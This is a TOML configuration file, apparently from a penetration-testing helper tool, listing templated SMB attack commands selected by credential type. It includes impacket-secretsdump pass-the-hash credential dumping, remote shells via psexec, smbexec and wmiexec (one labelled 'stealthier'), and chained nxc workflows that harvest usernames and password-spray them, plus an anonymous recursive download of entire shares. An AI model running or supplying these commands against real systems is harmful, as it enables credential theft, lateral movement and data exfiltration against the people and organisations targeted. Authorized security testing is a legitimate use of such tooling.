id = "smb.impacket.secretsdump_hash"
title = "impacket-secretsdump — pass-the-hash"
template = "impacket-secretsdump -hashes ':{nt_hash}' '{user_at_domain}@{target}'"
requires = ["impacket-secretsdump"]
tags = ["dump", "secretsdump", "pth"]
when = "creds.kind == 'ntlm'"

# === Remote exec ===

[[command]]
id = "smb.impacket.smbexec"
title = "impacket-smbexec (semi-interactive)"
template = "impacket-smbexec '{user_at_domain}:{password}@{target}'"
requires = ["impacket-smbexec"]
tags = ["exec", "shell", "interactive"]
interactive = true
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.impacket.psexec"
title = "impacket-psexec (SYSTEM shell)"
template = "impacket-psexec '{user_at_domain}:{password}@{target}'"
requires = ["impacket-psexec"]
tags = ["exec", "shell", "interactive", "noisy"]
interactive = true
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.impacket.wmiexec"
title = "impacket-wmiexec (stealthier)"
template = "impacket-wmiexec '{user_at_domain}:{password}@{target}'"
requires = ["impacket-wmiexec"]
tags = ["exec", "shell", "interactive"]
interactive = true
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.impacket.atexec"
title = "impacket-atexec (Scheduled-task exec)"
template = "impacket-atexec '{user_at_domain}:{password}@{target}' 'whoami /all'"
requires = ["impacket-atexec"]
tags = ["exec"]
when = "creds.kind == 'plaintext'"

[[command]]
id = "smb.nxc.exec_whoami"
title = "nxc smb — exec whoami /all (-x)"
template = "nxc smb {target} {nxc_auth} -x 'whoami /all'"
requires = ["nxc"]
tags = ["exec", "nxc"]
when = "creds.kind in ['plaintext','ntlm']"

[[command]]
id = "smb.nxc.powershell"
title = "nxc smb — PowerShell one-liner (-X)"
template = "nxc smb {target} {nxc_auth} -X 'Get-LocalUser | Select-Object Name,Enabled,LastLogon'"
requires = ["nxc"]
tags = ["exec", "nxc"]
when = "creds.kind in ['plaintext','ntlm']"

# === Chained workflows ===

[[command]]
id = "smb.chain.enum_to_spray"
title = "Harvest users → password spray"
template = """nxc smb {target} {nxc_auth} --users 2>/dev/null \\
 | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
 && nxc smb {target} -u {userlist} -p '{spray_password}' --continue-on-success"""
requires = ["nxc"]
tags = ["chain", "spray", "harvest"]

[[command]]
id = "smb.chain.guest_enum_download"
title = "Guest share enum → recursive smbclient download"
template = """smbclient -L //{target} -N \\
 && smbclient //{target}/{share} -N -D {local_path} -c 'prompt OFF; recurse; mget *'"""
requires = ["smbclient"]
tags = ["chain", "guest", "download"]

[[command]]
id = "smb.chain.authed_spider_spray"
title = "Spider shares → harvest users → spray"
template = """nxc smb {target} {nxc_auth} -M spider_plus -o DOWNLOAD_FLAG=False \\
 && nxc smb {target} {nxc_auth} --users --rid-brute \\
 | awk '/SidTypeUser/ {print $NF} /\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
 && nxc smb {target} -u {userlist} -p '{spray_password}' --jitter 3 --continue-on-success"""
requires = ["nxc"]
tags = ["chain", "spider", "spray", "harvest"]
